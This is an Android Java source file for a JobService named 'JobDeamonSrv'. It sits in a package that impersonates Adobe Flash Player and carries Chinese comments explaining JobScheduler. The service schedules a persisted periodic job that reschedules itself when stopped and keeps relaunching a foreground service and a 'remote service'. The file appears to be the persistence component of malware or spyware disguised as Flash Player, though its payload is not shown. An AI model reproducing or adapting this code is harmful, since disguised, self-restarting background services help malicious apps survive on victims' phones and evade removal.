package com.adobe.flashplayer.core;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;




public class JobDeamonSrv extends JobService{
    private final String TAG = "[ljg]JobDeamonSrv ";
    private static int JobId = 0;

    @Override
    public void onCreate(){

        super.onCreate();
        Log.e(TAG, "onCreate");
    }

    @Override
    public void onDestroy(){
        super.onDestroy();
        Log.e(TAG, "onDestroy");
        MyLog.writeLogFile(TAG+"onDestroy\r\n");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e(TAG, "onStartCommand");
        MyLog.writeLogFile(TAG+"onStartCommand\r\n");

        myScheduleJob();

        //return START_STICKY; this will have no effect
        return START_NOT_STICKY;
    }


    @Override
    public boolean onStartJob(JobParameters params) {
        Log.e(TAG, "onStartJob");

        MyLog.writeLogFile(TAG+"onStartJob\r\n");

        CoreHelper.startForegroundService(this);

        CoreHelper.startRemoteService(this);

        jobFinished(params, true);
        //onStartJob():Job开始时的回调，实现实际的工作逻辑。注意，如果返回false的话，系统会自动结束本job。

        return true;
    }



    @Override
    public boolean onStopJob(JobParameters params) {
        Log.e(TAG, "onStopJob");
        MyLog.writeLogFile(TAG+"onStopJob\r\n");

        myScheduleJob();

        jobFinished(params, true);
        //jobFinished(): Job执行完毕后，由App端自己调用，以通知JobScheduler已经完成了任务。注意，该方法调用导致的Job结束并不会回调onStopJob(),只会回调onDestroy()。

        //在条件不满足的时候系统会强制停止该Job并回调onStopJob()。
        //onStopJob()里执行停止本地任务的逻辑。
        // 如果希望该Job在条件满足的时候被重新启动，应该将返回值置为true。
        return true;
    }

    //JobService是JobScheduler的回调，是安排的Job请求的实际处理类。
    //需要我们覆写 onStartJob(JobParameters)方法，并在里面实现实际的任务逻辑。
    //因为JobService的执行是在APP的主线程里响应的，所以必须提供额外的异步逻辑去执行这些任务。

    public int myScheduleJob() {
        ComponentName compname = new ComponentName(this, JobDeamonSrv.class);
        JobInfo.Builder builder = new JobInfo.Builder(JobId++, compname);
        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
        builder.setPersisted(true);
        builder.setRequiresCharging(false);
        builder.setRequiresDeviceIdle(false);
        builder.setPeriodic(Public.JOBSERVICEMAXDELAY);
        builder.setBackoffCriteria(Public.JOBSERVICEDELAY,JobInfo.BACKOFF_POLICY_LINEAR);
        JobInfo jobInfo = builder.build();
        JobScheduler js =(JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
        int ret = js.schedule(jobInfo);
        if (ret > 0) {
            Log.e(TAG,"schedule job ok");
        }else{
            Log.e(TAG,"schedule job error");
        }
        return ret;
    }


}
